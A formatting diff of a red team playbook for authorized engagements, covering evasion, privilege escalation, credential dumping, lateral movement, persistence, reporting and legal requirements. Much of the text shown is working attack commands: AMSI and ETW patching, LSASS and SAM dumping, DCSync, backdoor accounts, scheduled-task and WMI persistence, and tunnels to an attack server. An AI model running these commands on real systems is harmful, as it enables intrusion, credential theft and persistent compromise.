-**Memory Patching:** Patching the AmsiScanBuffer function in amsi.dll loaded in the PowerShell process to always return AMSI_RESULT_CLEAN is a well-known bypass. Exact patch bytes vary by Windows version. EDR solutions increasingly monitor for attempts to modify amsi.dll in memory.
+Memory Patching: Patching the AmsiScanBuffer function in amsi.dll loaded in the PowerShell process to always return AMSI_RESULT_CLEAN is a well-known bypass. Exact patch bytes vary by Windows version. EDR solutions increasingly monitor for attempts to modify amsi.dll in memory.
 
-**PowerShell Obfuscation:**
+PowerShell Obfuscation:
 Invoke-Obfuscation and similar tools transform PowerShell scripts through token substitution, string concatenation, encoding, and reordering to defeat string-based signatures. String concatenation prevents static matching of complete bypass strings.
 
-**AMSI Provider Unloading:** COM-based approach to unload the registered AMSI provider from the current process. Requires finding and releasing the COM object reference to the AMSI provider interface.
+AMSI Provider Unloading: COM-based approach to unload the registered AMSI provider from the current process. Requires finding and releasing the COM object reference to the AMSI provider interface.
 
 ### 5.4 ETW Patching
 
@@ -579,7 +579,7 @@ Event Tracing for Windows (ETW) is used by EDR solutions to receive telemetry ab
 
 Primary targets are NtTraceEvent and EtwEventWrite. Patching approach: overwrite the first bytes of the function with a RET instruction (0xC3) or a NOP sled followed by RET. EDR solutions monitor for attempts to patch these functions — combining ETW patching with process injection into a trusted process reduces this detection surface.
 
-### 5.5 Living off the Land Binaries (LOLBins) — T1218
+### 5.5 Living off the Land Binaries (LOLBins): T1218
 
 Windows provides many signed Microsoft binaries that can be abused to execute arbitrary code or download files, bypassing application whitelisting.
 
@@ -605,19 +605,19 @@ wscript.exe payload.js
 cscript.exe //nologo payload.vbs
 ```
 
-**LOLBins reference resources:** lolbas-project.github.io (Windows binaries), gtfobins.github.io (Linux equivalents).
+LOLBins reference resources: lolbas-project.github.io (Windows binaries), gtfobins.github.io (Linux equivalents).
 
 ### 5.6 Compiler & Language Evasion
 
 Static signature detection is language and compiler-specific. Using non-standard languages for implant development reduces signature coverage.
 
-**Nim:** Systems language compiling to native code with Python-like syntax. Very low initial AV detection rates. WinAPI access via the winim library. Shellcode loaders in Nim have been effective against many EDRs.
+Nim: Systems language compiling to native code with Python-like syntax. Very low initial AV detection rates. WinAPI access via the winim library. Shellcode loaders in Nim have been effective against many EDRs.
 
-**Go with Garble:** Garble (`-seed=random`) obfuscates Go binaries by renaming identifiers, removing debug symbols, and encrypting string literals. Produces binaries with low static detection.
+Go with Garble: Garble (`-seed=random`) obfuscates Go binaries by renaming identifiers, removing debug symbols, and encrypting string literals. Produces binaries with low static detection.
 
-**Rust:** Memory-safe systems language. Shellcode loaders written in Rust have low initial detection due to unusual PE structure and RTTI layout unfamiliar to AV engines.
+Rust: Memory-safe systems language. Shellcode loaders written in Rust have low initial detection due to unusual PE structure and RTTI layout unfamiliar to AV engines.
 
-**PE-to-Shellcode Conversion:**
+PE-to-Shellcode Conversion:
 
 ```bash
 # donut converts PE/DLL/.NET to position-independent shellcode
@@ -626,7 +626,7 @@ donut -a x64 -f 1 -i implant.exe -o shellcode.bin
 # -f: format (1=raw, 2=base64, 3=c, 4=ruby, 5=python, 6=hex, 7=uuid, 8=golang, 9=rust)
 ```
 
-**Sleep Obfuscation (Ekko Technique):**
+Sleep Obfuscation (Ekko Technique):
 While the beacon is sleeping, encrypt all beacon memory using Windows Cryptographic APIs via a ROP chain executed in a timer callback. Memory is decrypted just before execution resumes. Defenders scanning process memory during the sleep period see only encrypted data, not shellcode or recognizable strings.
 
 ---
@@ -637,7 +637,7 @@ While the beacon is sleeping, encrypt all beacon memory using Windows Cryptograp
 
 Privilege escalation on Windows involves transitioning from a low-privileged user context to SYSTEM, local administrator, or a domain-privileged account. Systematic enumeration is the foundation.
 
-**Automated Enumeration Tools:**
+Automated Enumeration Tools:
 - WinPEAS (winPEASany.exe): Comprehensive Windows privilege escalation enumeration script
 - PowerUp.ps1 (PowerSploit): PowerShell-based privilege escalation checks
 - Seatbelt: C# tool for situational awareness and security configuration enumeration
@@ -645,7 +645,7 @@ Privilege escalation on Windows involves transitioning from a low-privileged use
 
 ### 6.2 Service-Based Escalation
 
-**Unquoted Service Paths (T1574.009):**
+Unquoted Service Paths (T1574.009):
 When a service path contains spaces and is not quoted, Windows tries to execute each space-delimited word as a potential executable path.
 
 ```cmd
@@ -657,7 +657,7 @@ wmic service get name,displayname,pathname,startmode | findstr /i "auto" | finds
 # Place malicious binary at a path where write access exists
 ```
 
-**Weak Service ACLs (T1574.010):**
+Weak Service ACLs (T1574.010):
 
 ```cmd
 # Find services writable by Authenticated Users or current user
@@ -669,7 +669,7 @@ sc config VulnerableService binpath= "cmd.exe /c net user backdoor Pass123! /add
 sc start VulnerableService
 ```
 
-**AlwaysInstallElevated (T1548.002):**
+AlwaysInstallElevated (T1548.002):
 
 ```cmd
 # Check registry keys
@@ -685,7 +685,7 @@ msiexec /quiet /qn /i payload.msi
 
 Windows implements a token-based security model. Processes that hold SeImpersonatePrivilege (IIS, SQL Server service accounts, network service) can impersonate other logged-in users, including SYSTEM.
 
-**Potato Family Attacks:**
+Potato Family Attacks:
 All exploit SeImpersonatePrivilege via different Windows authentication coercion primitives:
 
 | Tool | Technique | Requirements |
@@ -705,10 +705,10 @@ GodPotato.exe -cmd "cmd /c whoami"
 
 User Account Control (UAC) prevents standard admin accounts from performing elevated actions without a consent prompt. Several bypasses auto-elevate without triggering the prompt.
 
-**CMSTPLUA COM Object (UACME Method #41):**
+CMSTPLUA COM Object (UACME Method #41):
 The CMSTPLUA COM interface is configured to auto-elevate. Instantiate it and use it to execute arbitrary code with elevated privileges.
 
-**Eventvwr.exe Registry Hijack:**
+Eventvwr.exe Registry Hijack:
 eventvwr.exe is auto-elevated and reads a registry key under HKCU for the MMC application to launch.
 
 ```powershell
@@ -718,9 +718,9 @@ Set-ItemProperty "HKCU:\Software\Classes\mscfile\shell\open\command" `
 Start-Process "eventvwr.exe"
 ```
 
-**Fodhelper.exe:** Similar HKCU registry hijack via ms-settings protocol handler. Persistent across many Windows 10 versions.
+Fodhelper.exe: Similar HKCU registry hijack via ms-settings protocol handler. Persistent across many Windows 10 versions.
 
-**UAC Bypass Detection:** Defenders look for unexpected child processes of known auto-elevating binaries and modifications to HKCU\Software\Classes during UAC bypass attempts.
+UAC Bypass Detection: Defenders look for unexpected child processes of known auto-elevating binaries and modifications to HKCU\Software\Classes during UAC bypass attempts.
 
 ### 6.5 Linux Privilege Escalation
 
@@ -753,7 +753,7 @@ searchsploit "linux kernel $(uname -r | cut -d'.' -f1,2)"
 
 ### 6.6 Cloud Privilege Escalation
 
-**AWS IAM Escalation (Pacu):**
+AWS IAM Escalation (Pacu):
 
 ```bash
 python3 pacu.py
@@ -768,7 +768,7 @@ run iam__privesc_scan
 # sts:AssumeRole -> if trust policy allows assumption from compromised principal
 ```
 
-**Azure Escalation:**
+Azure Escalation:
 - Contributor role can assign themselves Owner via role assignment if guard controls are missing
 - Automation account RunAs can be abused to execute commands as the Automation identity
 - Azure Function managed identity privilege escalation paths exist in many common configurations
@@ -781,7 +781,7 @@ run iam__privesc_scan
 
 Credential access is typically the highest-priority post-exploitation objective. Captured credentials enable lateral movement, persistence, and domain compromise.
 
-**LSASS Memory Acquisition:**
+LSASS Memory Acquisition:
 
 LSASS (Local Security Authority Subsystem Service) stores cached credential material in memory on Windows systems. Extracting this material requires SYSTEM or SeDebugPrivilege.
 
@@ -803,10 +803,10 @@ nanodump.x64.exe --write C:\Windows\Temp\lsass.dmp
 pypykatz lsa minidump lsass.dmp
 ```
 
-**PPL (Protected Process Light) Bypass:**
+PPL (Protected Process Light) Bypass:
 Modern Windows systems protect LSASS as a PPL, preventing standard processes from obtaining a handle. PPL bypasses include loading vulnerable drivers (BYOVD — Bring Your Own Vulnerable Driver) that operate at kernel level.
 
-**SAM Database Extraction:**
+SAM Database Extraction:
 
 ```cmd
 reg save HKLM\SAM C:\Temp\sam
@@ -816,7 +816,7 @@ reg save HKLM\SECURITY C:\Temp\security
 impacket-secretsdump -sam sam -system system -security security LOCAL
 ```
 
-**NTDS.dit Extraction via VSS:**
+NTDS.dit Extraction via VSS:
 
 ```cmd
 vssadmin create shadow /for=C:
@@ -846,7 +846,7 @@ hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule
 
 ### 7.3 Pass-the-Hash & Pass-the-Ticket
 
-**Pass-the-Hash (T1550.002):**
+Pass-the-Hash (T1550.002):
 NTLM authentication allows authentication using only the password hash. Captured NT hashes can authenticate to any system that uses NTLM.
 
 ```bash
@@ -868,7 +868,7 @@ crackmapexec smb 10.0.0.0/24 -u administrator -H NThash --sam
 evil-winrm -i target -u administrator -H NThash
 ```
 
-**Pass-the-Ticket (T1550.003):**
+Pass-the-Ticket (T1550.003):
 
 ```powershell
 # Rubeus — request TGT with captured hash (overpass-the-hash)
@@ -883,18 +883,18 @@ klist
 
 ### 7.4 Additional Credential Harvesting
 
-**LaZagne:** Multi-platform credential recovery tool that extracts credentials from browsers, email clients, databases, wireless networks, and application credential stores.
+LaZagne: Multi-platform credential recovery tool that extracts credentials from browsers, email clients, databases, wireless networks, and application credential stores.
 
-**Cloud credential targets:**
-- `~/.aws/credentials` and `~/.aws/config` — AWS access key pairs
-- `~/.azure/` directory — Azure CLI cached tokens
-- `~/.config/gcloud/` — GCP application default credentials
+Cloud credential targets:
+- `~/.aws/credentials` and `~/.aws/config`: AWS access key pairs
+- `~/.azure/` directory: Azure CLI cached tokens
+- `~/.config/gcloud/`: GCP application default credentials
 - Environment variables: AWS_ACCESS_KEY_ID, AZURE_CLIENT_SECRET, etc.
 - Instance metadata service (IMDS): `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
 
 ### 7.5 Pivoting & Tunneling
 
-**Ligolo-ng (recommended for clean routing):**
+Ligolo-ng (recommended for clean routing):
 
 ```bash
 # On attack server: start agent listener
@@ -908,7 +908,7 @@ sudo ip route add 10.0.0.0/8 dev ligolo
 # Any tool on the attack server can now reach internal network directly
 ```
 
-**Chisel (HTTP-based tunnel with SOCKS5):**
+Chisel (HTTP-based tunnel with SOCKS5):
 
 ```bash
 # Server (attack system)
@@ -921,7 +921,7 @@ chisel client ATTACK_SERVER:8080 R:socks
 proxychains impacket-wmiexec domain/user@internal-target -hashes :hash
 ```
 
-**SSHuttle (VPN-over-SSH):**
+SSHuttle (VPN-over-SSH):
 
 ```bash
 sshuttle -r user@compromised-host 10.0.0.0/8 192.168.0.0/16
@@ -953,7 +953,7 @@ dir \\dc01\c$
 # Forged tickets with 10-year lifetime (old default) create anomalous Kerberos event 4769
 ```
 
-**DCSync Attack (T1003.006):**
+DCSync Attack (T1003.006):
 Abuse Directory Replication Service (DRS) privileges to replicate all user credentials from the domain controller without logging into the DC. Requires Replicating Directory Changes and Replicating Directory Changes All privileges.
 
 ```bash
@@ -963,7 +963,7 @@ mimikatz # lsadump::dcsync /domain:corp.local /all /csv
 
 ### 8.2 Domain Persistence Techniques
 
-**AdminSDHolder Backdoor (T1078.002):**
+AdminSDHolder Backdoor (T1078.002):
 AdminSDHolder is a special AD object whose DACL is used as a template for protected groups. The SDProp process (runs every 60 minutes) resets the ACL of all protected group members to match AdminSDHolder. Adding an attacker-controlled account to AdminSDHolder's ACL propagates that access to all protected AD objects within 60 minutes — persistently, even if manually removed from the actual groups.
 
 ```bash
@@ -973,10 +973,10 @@ impacket-dacledit corp.local/administrator:'Password' -action write \
   -target-dn "CN=AdminSDHolder,CN=System,DC=corp,DC=local"
 ```
 
-**SID History Injection (T1134.005):**
+SID History Injection (T1134.005):
 The SIDHistory attribute allows migrated accounts to retain access from old domains. Adding a high-privileged SID (e.g., Enterprise Admins SID) to a regular account's SIDHistory grants those privileges whenever the account authenticates.
 
-**AD CS Certificate Persistence (T1649):**
+AD CS Certificate Persistence (T1649):
 Active Directory Certificate Services misconfigurations enable attackers to enroll certificates that authenticate as privileged users indefinitely.
 
 ```bash
@@ -993,19 +993,19 @@ certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
 
 ### 8.3 Windows Persistence Techniques
 
-**Registry Run Keys (T1547.001):**
+Registry Run Keys (T1547.001):
 ```cmd
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "MicrosoftUpdate" /t REG_SZ /d "C:\Users\Public\implant.exe"
 reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "SecurityHealth" /t REG_SZ /d "C:\Windows\Temp\implant.exe"
 ```
 
-**Scheduled Tasks (T1053.005):**
+Scheduled Tasks (T1053.005):
 ```cmd
 schtasks /create /sc ONLOGON /tn "MicrosoftEdgeUpdate" /tr "C:\ProgramData\implant.exe" /ru SYSTEM /f
 schtasks /create /sc MINUTE /mo 15 /tn "WindowsDefender" /tr "C:\Windows\Temp\implant.exe" /ru SYSTEM /f
 ```
 
-**WMI Event Subscription (T1546.003) — Fileless persistence:**
+WMI Event Subscription (T1546.003) — Fileless persistence:
 ```powershell
 $Filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
 $Filter.Name = "UpdateFilter"
@@ -1025,7 +1025,7 @@ $Binding.Consumer = $Consumer.Path.RelativePath
 $Binding.Put()
 ```
 
-**COM Hijacking (T1546.015):**
+COM Hijacking (T1546.015):
 ```cmd
 reg add "HKCU\Software\Classes\CLSID\{TARGET_CLSID}\InprocServer32" /ve /t REG_SZ /d "C:\Users\Public\malicious.dll"
 reg add "HKCU\Software\Classes\CLSID\{TARGET_CLSID}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Both"
@@ -1051,11 +1051,11 @@ echo "/tmp/.evil.so" > /etc/ld.so.preload
 
 ### 8.5 Cloud Persistence
 
-**AWS Lambda Backdoor:** Create a Lambda function with malicious code that exfiltrates credentials or creates persistent admin access. Schedule via EventBridge for periodic execution.
+AWS Lambda Backdoor: Create a Lambda function with malicious code that exfiltrates credentials or creates persistent admin access. Schedule via EventBridge for periodic execution.
 
-**SSM Automation Runbook:** Create a Systems Manager Automation runbook that executes commands on EC2 instances on a schedule. Less visible than Lambda, operates via managed service.
+SSM Automation Runbook: Create a Systems Manager Automation runbook that executes commands on EC2 instances on a schedule. Less visible than Lambda, operates via managed service.
 
-**Azure Runbook:** Create an Azure Automation runbook that executes PowerShell against domain-joined VMs. Trigger via Automation Schedule for persistent access even if the initial foothold is removed.
+Azure Runbook: Create an Azure Automation runbook that executes PowerShell against domain-joined VMs. Trigger via Automation Schedule for persistent access even if the initial foothold is removed.
 
 ---
 
@@ -1065,14 +1065,14 @@ echo "/tmp/.evil.so" > /etc/ld.so.preload
 
 The deliverable quality of a red team engagement directly determines whether findings are actioned or filed away. Reports must communicate technical findings clearly to both security practitioners and executive stakeholders.
 
-**Executive Summary (1-2 pages):**
+Executive Summary (1-2 pages):
 - Overall risk rating (Critical/High/Medium/Low or numeric 1-10) with brief justification
 - Critical path narrative: "An external attacker could have obtained financial data within 72 hours without triggering any security alerts. The attack chain began with a phishing email, progressed to domain administrator access within 4 hours, and concluded with unrestricted access to the production financial database."
 - Business impact statement: translate technical findings to business language (data exfiltration translates to regulatory fines and reputational damage; demonstrated ransomware capability translates to operational downtime and recovery costs)
 - 3-5 prioritized recommendations with effort estimates (Quick Win, Short-term, Long-term)
 - Engagement duration, scope summary, and team size
 
-**Attack Narrative (chronological kill chain):**
+Attack Narrative (chronological kill chain):
 Write as a story with timestamps and evidence. The narrative should be readable by a security professional who was not present during the engagement.
 
 ```
@@ -1088,8 +1088,8 @@ Day 2 - 16:30  svc_backup is Domain Admin. DCSync performed — all domain hashe
 Day 3 - 09:00  Primary objective achieved: read access to production financial database confirmed.
 ```
 
-**Technical Findings (one page per finding):**
-- Finding Title and MITRE ATT&CK ID (e.g., "MFA Push Fatigue — T1621")
+Technical Findings (one page per finding):
+- Finding Title and MITRE ATT&CK ID (e.g., "MFA Push Fatigue: T1621")
 - Severity rating with CVSS or qualitative justification
 - Description: what the vulnerability is and why it matters
 - Evidence: screenshots, command output (redacted if sensitive), timestamps
@@ -1097,7 +1097,7 @@ Day 3 - 09:00  Primary objective achieved: read access to production financial d
 - Remediation: specific, actionable steps with estimated effort (T-shirt sizing: XS/S/M/L/XL)
 - References: vendor advisories, MITRE ATT&CK link, relevant tooling
 
-**Appendices:**
+Appendices:
 - Full IOC list: C2 IP addresses, domains used, payload file hashes (SHA256), named pipes, mutex values, registry keys created, scheduled task names, user accounts created
 - Tools used during engagement
 - Scope confirmation (copy of signed authorization letter dates/scope)
@@ -1135,17 +1135,17 @@ The layer file can be imported into the ATT&CK Navigator web tool and overlaid a
 
 ### 9.3 Purple Team Integration Workflow
 
-**Standard Purple Team Loop:**
+Standard Purple Team Loop:
 
-1. **Red team executes** a specific TTP (e.g., runs Mimikatz sekurlsa::logonpasswords)
-2. **Notify blue team** immediately after execution via agreed communication channel ("T1003.001 executed on HOST01 at 14:22 UTC")
-3. **Blue team checks** SIEM/EDR: did an alert fire? Was the event logged? Was it prioritized?
-4. **Joint analysis:** If detection worked — document as "detected", move to next TTP. If detection failed — identify which log source should have captured it, determine why it did not, write or tune detection rule together.
-5. **Red team re-executes** the same TTP to confirm the new detection rule fires.
-6. **Document in VECTR:** create test case, record detection status, note rule that was created.
-7. **Iterate** to next TTP in the exercise plan.
+1. Red team executes a specific TTP (e.g., runs Mimikatz sekurlsa::logonpasswords)
+2. Notify blue team immediately after execution via agreed communication channel ("T1003.001 executed on HOST01 at 14:22 UTC")
+3. Blue team checks SIEM/EDR: did an alert fire? Was the event logged? Was it prioritized?
+4. Joint analysis: If detection worked: document as "detected", move to next TTP. If detection failed — identify which log source should have captured it, determine why it did not, write or tune detection rule together.
+5. Red team re-executes the same TTP to confirm the new detection rule fires.
+6. Document in VECTR: create test case, record detection status, note rule that was created.
+7. Iterate to next TTP in the exercise plan.
 
-**VECTR Platform (vectr.io):**
+VECTR Platform (vectr.io):
 Open-source (community edition) and commercial platform for red team/purple team tracking. Features:
 - Engagement management and test case library
 - Technique-level detection scoring (Detected/Prevented/Alerted/Logged/Missed)
@@ -1171,14 +1171,14 @@ BAS supplements but does not replace human red teaming. BAS tools cannot adapt t
 
 Metrics demonstrate red team value to leadership and enable tracking of defensive improvement over time.
 
-**Key Metrics to Track:**
-- **Detection Rate by MITRE Tactic:** What percentage of techniques in each tactic category resulted in a security alert? Target: improve quarter-over-quarter.
-- **Mean Time to Detection (MTTD):** How long between TTP execution and alert firing?
-- **Mean Time to Response (MTTR):** How long between alert and analyst action?
-- **Mean Dwell Time:** How many days between initial access and detection in no-notice exercises?
-- **Purple Team Test Coverage:** What percentage of MITRE ATT&CK techniques applicable to the organization's threat model have been tested?
-- **Finding Remediation Rate:** What percentage of prior red team findings have been remediated at time of next assessment?
-- **Escalation Time:** How long for an analyst to escalate a detected incident to the incident response team?
+Key Metrics to Track:
+- Detection Rate by MITRE Tactic: What percentage of techniques in each tactic category resulted in a security alert? Target: improve quarter-over-quarter.
+- Mean Time to Detection (MTTD): How long between TTP execution and alert firing?
+- Mean Time to Response (MTTR): How long between alert and analyst action?
+- Mean Dwell Time: How many days between initial access and detection in no-notice exercises?
+- Purple Team Test Coverage: What percentage of MITRE ATT&CK techniques applicable to the organization's threat model have been tested?
+- Finding Remediation Rate: What percentage of prior red team findings have been remediated at time of next assessment?
+- Escalation Time: How long for an analyst to escalate a detected incident to the incident response team?
 
 ---
 
@@ -1186,7 +1186,7 @@ Metrics demonstrate red team value to leadership and enable tracking of defensiv
 
 ### 10.1 Tooling by Engagement Phase
 
-**Reconnaissance & OSINT:**
+Reconnaissance & OSINT:
 
 | Tool | Purpose | Source |
 |---|---|---|
@@ -1202,7 +1202,7 @@ Metrics demonstrate red team value to leadership and enable tracking of defensiv
 | CloudEnum | Cloud resource enumeration (AWS/Azure/GCP) | github.com/initstring/cloud_enum |
 | EyeWitness | Web screenshot and service enumeration | github.com/RedSiege/EyeWitness |
 
-**Initial Access:**
+Initial Access:
 
 | Tool | Purpose | Source |
 |---|---|---|
@@ -1215,7 +1215,7 @@ Metrics demonstrate red team value to leadership and enable tracking of defensiv
 | Kerbrute | Kerberos-based user enumeration and password spray | github.com/ropnop/kerbrute |
 | Metasploit | Exploit framework with initial access modules | github.com/rapid7/metasploit-framework |
 
-**C2 Frameworks:**
+C2 Frameworks:
 
 | Framework | Type | Transport Options | Notable Features |
 |---|---|---|---|
@@ -1227,7 +1227,7 @@ Metrics demonstrate red team value to leadership and enable tracking of defensiv
 | Covenant | Open Source | HTTP/HTTPS | .NET-based, Grunt implant, web interface |
 | Metasploit | Open Source | TCP/HTTP/HTTPS | Broad exploit library, well-understood meterpreter |
 
-**Credential Access:**
+Credential Access:
 
 | Tool | Purpose | Notes |
 |---|---|---|
@@ -1240,7 +1240,7 @@ Metrics demonstrate red team value to leadership and enable tracking of defensiv
 | CrackMapExec | Network credential validation and execution at scale | SMB/WinRM/MSSQL/LDAP protocols |
 | Certipy | AD CS enumeration and exploitation | Certificate-based credential compromise and persistence |
 
-**Lateral Movement:**
+Lateral Movement:
 
 | Tool | Purpose | Protocol |
 |---|---|---|
@@ -1254,7 +1254,7 @@ Metrics demonstrate red team value to leadership and enable tracking of defensiv
 | sshuttle | VPN-over-SSH transparent routing | SSH |
 | Proxychains4 | Route arbitrary tools through SOCKS proxy | SOCKS4/5 |
 
-**Privilege Escalation:**
+Privilege Escalation:
 
 | Tool | Platform | Key Checks |
 |---|---|---|
@@ -1262,10 +1262,10 @@ Metrics demonstrate red team value to leadership and enable tracking of defensiv
 | LinPEAS | Linux | SUID, sudo, cron, capabilities, writable paths, NFS, container escapes |
 | PowerUp.ps1 | Windows | Service misconfigurations, unquoted paths, AlwaysInstallElevated |
 | Seatbelt | Windows | Security configuration, situational awareness, credential material locations |
-| AccessChk | Windows | Object ACL enumeration — legitimate Sysinternals binary |
+| AccessChk | Windows | Object ACL enumeration: legitimate Sysinternals binary |
 | PEASS-ng | Both | Combined WinPEAS/LinPEAS suite maintained actively |
 
-**Post-Exploitation (SharpCollection suite):**
+Post-Exploitation (SharpCollection suite):
 
 | Tool | Purpose |
 |---|---|
@@ -1278,7 +1278,7 @@ Metrics demonstrate red team value to leadership and enable tracking of defensiv
 | SharpChrome | Chrome credential and cookie extraction |
 | SharpRDP | RDP lateral movement without a graphical client |
 
-**Evasion & Payload Development:**
+Evasion & Payload Development:
 
 | Tool | Purpose |
 |---|---|
@@ -1290,7 +1290,7 @@ Metrics demonstrate red team value to leadership and enable tracking of defensiv
 | Invoke-Obfuscation | PowerShell obfuscation via token, AST, and encoding techniques |
 | Chameleon | PowerShell script obfuscation focused on bypassing AMSI and logging |
 
-**Wireless:**
+Wireless:
 
 | Tool | Purpose |
 |---|---|
@@ -1300,7 +1300,7 @@ Metrics demonstrate red team value to leadership and enable tracking of defensiv
 | hostapd-wpe | WPA Enterprise rogue AP for credential capture (MSCHAPV2 hash capture) |
 | EAPHammer | Targeted evil twin attacks against WPA2-Enterprise networks |
 
-**Reporting & Tracking:**
+Reporting & Tracking:
 
 | Tool | Purpose |
 |---|---|
@@ -1313,16 +1313,16 @@ Metrics demonstrate red team value to leadership and enable tracking of defensiv
 
 ### 10.2 Legal Frameworks & Authorized Testing Requirements
 
-**United States — Computer Fraud and Abuse Act (CFAA):**
+United States — Computer Fraud and Abuse Act (CFAA):
 The CFAA (18 U.S.C. § 1030) criminalizes unauthorized access to protected computers. The authorized access exception requires: written authorization from the asset owner or authorized representative (someone with legal authority to grant access rights), specific scope definition, and activities limited to the scope. Verbal authorization is insufficient. The authorization letter must predate any testing activity.
 
-**United Kingdom — Computer Misuse Act 1990 (CMA):**
+United Kingdom — Computer Misuse Act 1990 (CMA):
 Sections 1-3 cover unauthorized access offenses. The authorized user defense requires that the access was authorized by the owner or person responsible for the computer. Written authorization is strongly recommended. UK penetration testing firms often engage through CREST accreditation to provide clients with assurance of ethical standards.
 
-**EU — GDPR Considerations:**
+EU — GDPR Considerations:
 Even authorized testing that captures personal data (employee credentials, customer records discovered in scope) triggers GDPR obligations. ROE documents should specify data handling requirements: encrypted storage, limited access, retention period, and deletion confirmation post-engagement.
 
-**Penetration Testing Agreement Requirements:**
+Penetration Testing Agreement Requirements:
 Regardless of jurisdiction, a valid authorization agreement should include:
 1. Identity of authorizing party (with authority to grant access)
 2. Specific systems in scope (IP ranges, domains, application names)
@@ -1335,7 +1335,7 @@ Regardless of jurisdiction, a valid authorization agreement should include:
 
 ### 10.3 Engagement Checklists
 
-**Pre-Engagement:**
+Pre-Engagement:
 - [ ] Scope defined in writing and signed by authorized representative
 - [ ] ROE document completed and approved by both parties
 - [ ] GOOJ letters printed and distributed to all operators
@@ -1347,17 +1347,17 @@ Regardless of jurisdiction, a valid authorization agreement should include:
 - [ ] Operator briefing: all team members have read and understood the ROE document
 - [ ] Evidence collection system established (screenshots, terminal logs, timestamps)
 
-**During Engagement:**
+During Engagement:
 - [ ] All actions logged with timestamps (operator name, system targeted, action taken, result)
 - [ ] Screenshots captured for all significant findings
-- [ ] No actions taken outside defined scope — check scope document before proceeding with any new target
+- [ ] No actions taken outside defined scope: check scope document before proceeding with any new target
 - [ ] Deconfliction channel monitored continuously during active testing
 - [ ] Daily check-in with client POC during long-running engagements
 - [ ] Any discovered real-world threat actor indicators immediately reported to client
-- [ ] Data sensitivity respected — do not read, copy, or exfiltrate data beyond what is necessary to prove access
-- [ ] If in doubt about whether an action is in scope — stop and confirm with client before proceeding
+- [ ] Data sensitivity respected: do not read, copy, or exfiltrate data beyond what is necessary to prove access
+- [ ] If in doubt about whether an action is in scope: stop and confirm with client before proceeding
 
-**Post-Engagement:**
+Post-Engagement:
 - [ ] All persistence mechanisms removed (registry keys, scheduled tasks, user accounts, WMI subscriptions, SSH keys)
 - [ ] All deployed tools and implant files removed from target systems
 - [ ] C2 callbacks confirmed ceased
@@ -1369,7 +1369,7 @@ Regardless of jurisdiction, a valid authorization agreement should include:
 
 ### 10.4 Training Resources & Certification Pathways
 
-**Hands-On Practice Environments:**
+Hands-On Practice Environments:
 
 | Platform | Recommended Labs | Focus |
 |---|---|---|
@@ -1379,7 +1379,7 @@ Regardless of jurisdiction, a valid authorization agreement should include:
 | VulnHub | Downloadable vulnerable VMs | Offline practice |
 | AttackDefense (Pentester Academy) | Browser-based lab environment with guided courses | Red team certifications |
 
-**Relevant Certifications:**
+Relevant Certifications:
 
 | Certification | Issuer | Focus |
 |---|---|---|
@@ -1391,13 +1391,13 @@ Regardless of jurisdiction, a valid authorization agreement should include:
 | OSED (Offensive Security Exploit Developer) | OffSec | Windows exploit development |
 | GXPN (GIAC Exploit Researcher and Advanced Penetration Tester) | SANS/GIAC | Advanced exploitation and research |
 
-**Key Reading & Research Sources:**
-- SpecterOps blog (posts.specterops.io) — AD security, detection, and red team research
-- MDSec blog (mdsec.co.uk/category/blog) — adversary simulation, evasion, tooling
-- MITRE ATT&CK (attack.mitre.org) — adversary TTP knowledge base and framework
-- The C2 Matrix (thec2matrix.com) — comprehensive C2 framework comparison
-- ired.team notes — practical red team technique documentation
-- Sektor7 courses — malware development and evasion tradecraft
+Key Reading & Research Sources:
+- SpecterOps blog (posts.specterops.io): AD security, detection, and red team research
+- MDSec blog (mdsec.co.uk/category/blog): adversary simulation, evasion, tooling
+- MITRE ATT&CK (attack.mitre.org): adversary TTP knowledge base and framework
+- The C2 Matrix (thec2matrix.com): comprehensive C2 framework comparison
+- ired.team notes: practical red team technique documentation
+- Sektor7 courses: malware development and evasion tradecraft
 
 ---
 
